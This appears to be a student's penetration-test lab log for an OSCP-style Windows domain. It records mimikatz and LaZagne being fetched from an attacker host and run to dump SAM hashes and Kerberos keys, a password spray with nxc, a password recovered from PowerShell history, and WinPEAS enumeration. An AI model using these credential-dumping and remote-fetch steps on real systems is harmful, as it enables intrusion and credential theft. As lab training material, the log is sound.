# Mimikatz

```powershell
PS C:\Users\Administrator> net use \\192.168.49.104\share /user:username pw
The command completed successfully.

PS C:\Users\Administrator> cp \\192.168.49.104\share\mimikatz.exe .
PS C:\Users\Administrator> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # log logonpasswords.txt
Using 'logonpasswords.txt' for logfile : OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

700     {0;000003e7} 1 D 43270          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00e24f5d} 3 D 16065372    WS26\Administrator      S-1-5-21-2756297892-2186407355-380279769-500    (14g,25p)       Primary
 * Thread Token  : {0;000003e7} 1 D 16177523    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # lsadump::sam
Domain : WS26
SysKey : 6efca182500dc518f4c19cf5341a30d4
Local SID : S-1-5-21-2756297892-2186407355-380279769

SAMKey : 24426470f121aa90530be4b3c19d878b

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6d2907763f2fdae4099a65bdb012045c
    lm  - 0: 407b7adefdd553a2de47fb9811116f29
    ntlm- 0: 6d2907763f2fdae4099a65bdb012045c
    ntlm- 1: 6d2907763f2fdae4099a65bdb012045c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e7d88aabdeda8a50b6c8bd4ea585dd44

* Primary:Kerberos-Newer-Keys *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e9f31a70b7ddcdd063ba3f337a9d58bf2103f34602f47b51a57465253ab811bd
      aes128_hmac       (4096) : d936e790bfe354dc5357fbca7f15b778
      des_cbc_md5       (4096) : 9b98987002327fce
    OldCredentials
      aes256_hmac       (4096) : 18e95cb5dfb458db5c3202bdd5045ed141a70a2af39860d1042113ab3fa3f9ad
      aes128_hmac       (4096) : 45290fc8d9c01413cef0a27ccc91f347
      des_cbc_md5       (4096) : 5d8525c8d6ab9d52
    OlderCredentials
      aes256_hmac       (4096) : 53c7cdd42d708d6ec10e1c7814c62167bad6454ea6dc42d9e5c1bb8ab7b9d79d
      aes128_hmac       (4096) : ea7898e7e9d3e319005056b9e5f7dd43
      des_cbc_md5       (4096) : 91ce9dab57548f0b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Credentials
      des_cbc_md5       : 9b98987002327fce
    OldCredentials
      des_cbc_md5       : 5d8525c8d6ab9d52


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5403e400be738dd915e176be5da78216

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : aedf7c3484786b0b08c3cf5390100e59

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fde783dddc7dba274cdb578e91c742114e263fda3f85d2de370b2094d1de0bc0
      aes128_hmac       (4096) : ded4018116eea7e5616be59ae6ffe2e2
      des_cbc_md5       (4096) : eca497e5c275648c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : eca497e5c275648c
      
mimikatz # sekurlsa::tickets /export
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

---

# Lazagne -> nothing

- [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
```powershell
iwr -uri http://192.168.49.104:8888/LaZagne.exe -OutFile .\LaZagne.exe
.\LaZagne.exe all -oN -output lazagne.out
```

```powershell

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for ab60b95f-cb94-4504-a93b-31d9b15405e3
[+] System masterkey decrypted for aca15899-6cbe-4714-8149-c735649cf731
[+] System masterkey decrypted for b4823bcd-ed47-4b7d-8d22-cda7c58bad55

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:6d2907763f2fdae4099a65bdb012045c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5403e400be738dd915e176be5da78216:::

------------------- Lsa_secrets passwords -----------------

$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   CB AC F8 C8 0C D5 A1 04 73 BE D9 5C FA 43 1C 43    ........s....C.C
0020   A0 86 2E B8 7D D0 15 97 06 9D FD CE 0D 88 42 41    ....}.........BA
0030   5F DD BC 34 57 B0 E2 C6 07 C8 CA 93 B6 5D E6 B8    _..4W........]..
0040   23 6A FD 5F 67 00 C0 6B B1 AC 86 ED D4 53 6D 78    #j._g..k.....Smx
0050   7F E3 45 93 FD 1A 63 95 1A 1B 1A 0D 06 B7 9E 9C    ..E...c.........
0060   6C 66 10 DD 34 8A 59 20 79 C6 E4 9D 7D 0E AD 5E    lf..4.Y y...}..^
0070   D3 9A 71 61 6D 59 C4 DD 07 50 B2 42 D4 58 18 4F    ..qamY...P.B.X.O
0080   8C 53 15 6E D0 9A 14 DE 8B 0E E8 D1 0B 61 CD 78    .S.n.........a.x
0090   CE 05 FD FD 8E 51 51 7C FD 1D 1A 3A 88 FE 6A F3    .....QQ|...:..j.
00A0   A9 93 54 5A AE 95 8F A4 B7 E0 12 B0 4D DF 71 B6    ..TZ........M.q.
00B0   37 DD 52 C6 FA 2E 89 3F D2 05 1D BA 41 CD 2C 12    7.R....?....A.,.
00C0   AB 21 66 EB 62 1D B0 F6 46 31 00 06 71 4E 1B C8    .!f.b...F1..qN..
00D0   0E 85 BE 18 69 FC 6F 15 FE B4 D2 78 13 E1 2F 8C    ....i.o....x../.
00E0   D9 B7 11 7B 9E 3C 8F DA EB 2D 23 88 50 E8 F5 1B    ...{.<...-#.P...
00F0   F0 9E C6 3A E5 97 F9 45 82 A2 2B 5A 2F C7 FF A2    ...:...E..+Z/...
0100   4F 2D 3F EE 59 25 94 29 F1 D7 99 92 A8 C5 F6 4A    O-?.Y%.).......J

CachedDefaultPassword
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   4E C9 82 47 42 D3 7C 2A B0 FD E9 30 24 28 87 2C    N..GB.|*...0$(.,

DPAPI_SYSTEM
0000   01 00 00 00 34 38 73 E8 DB 25 7C 13 C9 32 03 90    ....48s..%|..2..
0010   93 FC 49 CE 7C 89 AD 77 83 20 CD 21 11 09 B1 4D    ..I.|..w. .!...M
0020   AA 17 9B E5 24 0B 2C 0B 3C B3 39 48                ....$.,.<.9H

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   00 2E 3D B8 6E 4F F2 1C 39 FC 87 12 9E A4 8C 18    ..=.nO..9.......
0020   21 16 B4 8F 59 92 96 84 96 DF CA 3B 8E 57 91 F9    !...Y......;.W..
0030   B6 1D 02 94 47 79 49 BB 12 98 64 78 B8 85 CA 31    ....GyI...dx...1
0040   B2 5C 56 1F 20 72 C8 26 38 80 05 F6 1E 39 E2 DE    ..V. r.&8....9..
0050   9A 20 53 4C 16 BF 5B 11 65 28 6C D7 56 61 A3 A2    . SL..[.e(l.Va..


[+] File written: .\credentials_22022026_014650.txt

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 5.043184995651245
PS C:\Users\Administrator>
```

---

# Admin Password spray -> 失敗

```sh
┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
└─$ nxc smb $TargetIP -u usernames.txt -p CarHammerChip964 --continue-on-success
SMB         172.16.104.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.ROGERS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\ADMINISTRATOR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\U.GREGORY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.DEAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\O.HUGHES@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\P.GETHIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\T.FUCHS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.WILLIAMS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.SKINNER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\G.JARVIS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\M.NEWMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\J.KOLE@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.TUCKER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\L.EVGENY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.ANDREWS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.GALLAGHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.FISCHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\K.FREEMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.CROSS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\E.DDWARDS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\D.HALL@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\F.HATFIELD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.MARTIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.PERRY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\A.BAILEY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\W.BYRD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\IUSR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 

```

---

# 列挙

- PowerShell Historyにパスワードを発見
`b.martin@oscp.exam:BusyWorkerDay777`
![[Pasted image 20260222190305.png]]

---

# WinPEAS 結果

- あまりに長文なので、一部意味のない箇所については割愛
```powershell

════════════════════════════════════╣ System Information ╠════════════════════════════════════

╔══════════╣ Basic System Information
╚ Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
    OS Name: Microsoft Windows 11 Enterprise
    OS Version: 10.0.22631 N/A Build 22631
    System Type: x64-based PC
    Hostname: WS26
    Domain Name: oscp.exam
    ProductName: Windows 10 Enterprise
    EditionID: Enterprise
    ReleaseId: 2009
    BuildBranch: ni_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: Japanese (Japan)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 2/22/2026 2:31:47 AM
    HighIntegrity: True
    PartOfDomain: True
    Hotfixes: KB5044033 (10/9/2024), KB5027397 (7/4/2024), KB5044285 (10/9/2024), KB5046247 (10/9/2024), 


╔══════════╣ Showing All Microsoft Updates
   HotFix ID                :   KB2267602
   Installed At (UTC)       :   2/22/2026 11:01:54 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   11/12/2024 2:50:21 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/29/2024 2:56:03 PM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/11/2024 9:26:30 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:17 AM
   Title                    :   9N8MHTPHNGVV-Microsoft.Windows.DevHome
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9N8MHTPHNGVV-1152921505698356525

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:16 AM
   Title                    :   9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9NH2SW16MQ7F-1152921505698229012

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:16 AM
   Title                    :   9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9NBLGGH4RV3K-1152921505697797915

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NTXGKQ8P7N0-MicrosoftWindows.CrossDevice
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NTXGKQ8P7N0-1152921505698361592

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NH2SW16MQ7F-1152921505698229012

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NBLGGH4RV3K-1152921505697797915

   =================================================================================================

   HotFix ID                :   KB5044285
   Installed At (UTC)       :   10/10/2024 2:15:03 AM
   Title                    :   2024-10 Cumulative Update for Windows 11 Version 23H2 for x64-based Systems (KB5044285)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.

   =================================================================================================

   HotFix ID                :   KB4023057
   Installed At (UTC)       :   10/10/2024 1:19:52 AM
   Title                    :   2023-11 Update for Windows 11 Version 23H2 for x64-based Systems (KB4023057)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.

   =================================================================================================

   HotFix ID                :   KB890830
   Installed At (UTC)       :   10/10/2024 1:19:48 AM
   Title                    :   Windows Malicious Software Removal Tool x64 - v5.129 (KB890830)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   After the download, this tool runs one time to check your computer for infection by specific, prevalent malicious software (including Blaster, Sasser, and Mydoom) and helps remove any infection that is found. If an infection is found, the tool will display a status report the next time that you start your computer. A new version of the tool will be offered every month. If you want to manually run the tool on your computer, you can download a copy from the Microsoft Download Center, or you can run an online version from microsoft.com. This tool is not a replacement for an antivirus product. To help protect your computer, you should use an antivirus product.

   =================================================================================================

   HotFix ID                :   KB5044033
   Installed At (UTC)       :   10/10/2024 1:18:32 AM
   Title                    :   2024-10 Cumulative Update for .NET Framework 3.5 and 4.8.1 for Windows 11, version 23H2 for x64 (KB5044033)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 1:18:02 AM
   Title                    :   Broadcom Inc. - Net - 1.9.19.0
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Broadcom Inc. Net  driver update released in  July 2024

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/10/2024 1:17:45 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================


╔══════════╣ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    10/10/2024 7:50:09 PM

╔══════════╣ User Environment Variables
╚ Check for some passwords or keys in the env variables 
    COMPUTERNAME: WS26
    USERPROFILE: C:\Users\Administrator
    HOMEPATH: \Users\Administrator
    LOCALAPPDATA: C:\Users\Administrator\AppData\Local
    PSModulePath: C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\WS26
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    TEMP: C:\Users\ADMINI~1\AppData\Local\Temp
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\Administrator\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: Administrator
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OneDrive: C:\Users\Administrator\OneDrive
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: WS26
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\ADMINI~1\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: WS26
    PUBLIC: C:\Users\Public
    EFC_4504: 1

╔══════════╣ System Environment Variables
╚ Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

╔══════════╣ Audit Settings
╚ Check what is being logged 
    Not Found

╔══════════╣ Audit Policy Settings - Classic & Advanced

╔══════════╣ WEF Settings
╚ Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

╔══════════╣ LAPS Settings
╚ If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

╔══════════╣ Wdigest
╚ If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

╔══════════╣ LSA Protection
╚ If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

╔══════════╣ Credentials Guard
╚ If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

╔══════════╣ Cached Creds
╚ If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

╔══════════╣ Enumerating saved credentials in Registry (CurrentPass)

╔══════════╣ AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

╔══════════╣ Windows Defender configuration
  Local Settings
  Group Policy Settings

╔══════════╣ UAC Status
╚ If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.

╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.22621.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 2751B

╔══════════╣ Enumerating PowerShell Session Settings using the registry
    Name                                   Microsoft.PowerShell
      BUILTIN\Administrators               AccessAllowed         
      NT AUTHORITY\INTERACTIVE             AccessAllowed         
      BUILTIN\Remote Management Users      AccessAllowed         
   =================================================================================================

    Name                                   Microsoft.PowerShell.Workflow
      BUILTIN\Administrators               AccessAllowed         
      BUILTIN\Remote Management Users      AccessAllowed         
   =================================================================================================

    Name                                   Microsoft.PowerShell32
      BUILTIN\Administrators               AccessAllowed         
      NT AUTHORITY\INTERACTIVE             AccessAllowed         
      BUILTIN\Remote Management Users      AccessAllowed         
   =================================================================================================


╔══════════╣ PS default transcripts history
╚ Read the PS history inside these files (if any)

╔══════════╣ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 10240
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 0
    EnableNegotiate: 1
    ProxyEnable: 0
    MigrateProxy: 1
    LockDatabase: 133729731834845714

╔══════════╣ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

╔══════════╣ Drives Information
╚ Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 24 GB)(Permissions: Authenticated Users [Allow: AppendData/CreateDirectories], Administrators [Allow: AllAccess])
    D:\ (Type: CDRom)

╔══════════╣ Checking WSUS
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

╔══════════╣ Checking KrbRelayUp
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (WS26) so it could be vulnerable.
╚ You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

╔══════════╣ Checking If Inside Container
╚ If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

╔══════════╣ Checking AlwaysInstallElevated
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

╔══════════╣ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Authentication Packages              :       msv1_0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       scecli
    Security Packages                    :       ""
    LsaPid                               :       748
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       4
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    RunAsPPL                             :       0
    IsPplAutoEnabled                     :       1
    SCENoApplyLegacyAuditPolicy          :       0
    TurnOffAnonymousBlock                :       0
    LsaConfigFlags                       :       0
    RunAsPPLBoot                         :       0

╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

╔══════════╣ Display Local Group Policy settings - local users/machine
   Type             :     machine
   Display Name     :     Default Domain Policy
   Name             :     {31B2F340-016D-11D2-945F-00C04FB984F9}
